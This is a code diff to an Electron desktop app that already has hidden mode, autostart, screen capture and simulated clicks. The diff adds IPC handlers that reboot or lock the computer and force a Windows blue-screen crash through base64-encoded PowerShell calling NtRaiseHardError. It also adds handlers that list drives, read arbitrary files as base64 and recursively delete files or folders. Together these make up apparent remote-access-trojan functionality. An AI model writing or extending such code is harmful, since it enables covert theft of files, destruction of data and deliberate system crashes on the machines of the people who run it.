@@ -1,6 +1,8 @@
 import { app, shell, BrowserWindow, dialog, Menu, ipcMain, desktopCapturer, powerSaveBlocker, screen } from 'electron'
 import { join } from 'path'
 import { exec } from 'child_process'
+import { readdirSync, statSync, readFileSync, unlinkSync, rmdirSync } from 'fs'
+import { homedir } from 'os'
 import { electronApp, optimizer, is } from '@electron-toolkit/utils'
 
 process.on('uncaughtException', (err) => {
@@ -157,6 +159,87 @@ ipcMain.handle('simulate-click', (_, nx, ny) => new Promise((resolve) => {
   }
 }))
 
+// ── System commands ──────────────────────────────────────────────────────────
+
+ipcMain.handle('system-reboot', () => new Promise((resolve) => {
+  exec(process.platform === 'win32' ? 'shutdown /r /t 0' : 'sudo reboot', () => resolve())
+}))
+
+ipcMain.handle('system-lock', () => new Promise((resolve) => {
+  exec(process.platform === 'win32' ? 'rundll32.exe user32.dll,LockWorkStation' : 'pmset displaysleepnow', () => resolve())
+}))
+
+ipcMain.handle('system-bsod', () => new Promise((resolve) => {
+  if (process.platform !== 'win32') { resolve(); return }
+  const script = [
+    'Add-Type -TypeDefinition @"',
+    'using System;',
+    'using System.Runtime.InteropServices;',
+    'public class Bsod {',
+    '  [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int p, bool e, bool t, out bool o);',
+    '  [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint s, uint n, uint m, IntPtr p, uint v, out uint r);',
+    '}',
+    '"@',
+    '[bool]$out = $false',
+    '[Bsod]::RtlAdjustPrivilege(19, $true, $false, [ref]$out) | Out-Null',
+    '[uint32]$r = 0',
+    '[Bsod]::NtRaiseHardError(0xc0000022, 0, 0, [IntPtr]::Zero, 6, [ref]$r) | Out-Null',
+  ].join('\n')
+  exec(`powershell -EncodedCommand ${Buffer.from(script, 'utf16le').toString('base64')}`, () => resolve())
+}))
+
+// ── File system ───────────────────────────────────────────────────────────────
+
+ipcMain.handle('fs-home', () => {
+  if (process.platform === 'win32') {
+    return new Promise((resolve) => {
+      exec('wmic logicaldisk get name /format:csv', (err, stdout) => {
+        const drives = err ? [] : stdout.trim().split('\n').slice(1).map(l => l.split(',')[1]?.trim()).filter(Boolean)
+        resolve({ home: homedir(), drives })
+      })
+    })
+  }
+  return { home: homedir(), drives: [] }
+})
+
+ipcMain.handle('fs-list', (_, path) => {
+  try {
+    const entries = readdirSync(path).map((name) => {
+      try {
+        const s = statSync(join(path, name))
+        return { name, isDir: s.isDirectory(), size: s.size, mtime: s.mtimeMs }
+      } catch {
+        return { name, isDir: false, size: 0, mtime: 0, error: true }
+      }
+    })
+    entries.sort((a, b) => (b.isDir - a.isDir) || a.name.localeCompare(b.name))
+    return { entries, error: null }
+  } catch (e) {
+    return { entries: [], error: e.message }
+  }
+})
+
+ipcMain.handle('fs-read', (_, filePath) => {
+  try {
+    const data = readFileSync(filePath)
+    if (data.length > 50 * 1024 * 1024) return { data: null, error: 'Файл слишком большой (> 50 МБ)' }
+    return { data: data.toString('base64'), name: filePath.split(/[\\/]/).pop(), error: null }
+  } catch (e) {
+    return { data: null, error: e.message }
+  }
+})
+
+ipcMain.handle('fs-delete', (_, filePath) => {
+  try {
+    const s = statSync(filePath)
+    if (s.isDirectory()) rmdirSync(filePath, { recursive: true })
+    else unlinkSync(filePath)
+    return { error: null }
+  } catch (e) {
+    return { error: e.message }
+  }
+})
+
 ipcMain.handle('force-quit', () => {
   mainWindow.destroy()
   app.quit()
@@ -169,6 +252,8 @@ ipcMain.handle('remove-autostart', () => {
 })
 
 ipcMain.handle('get-hidden-state', () => isHidden)
+
+ipcMain.handle('get-version', () => app.getVersion())
 
 // ── App lifecycle ────────────────────────────────────────────────────────────
 
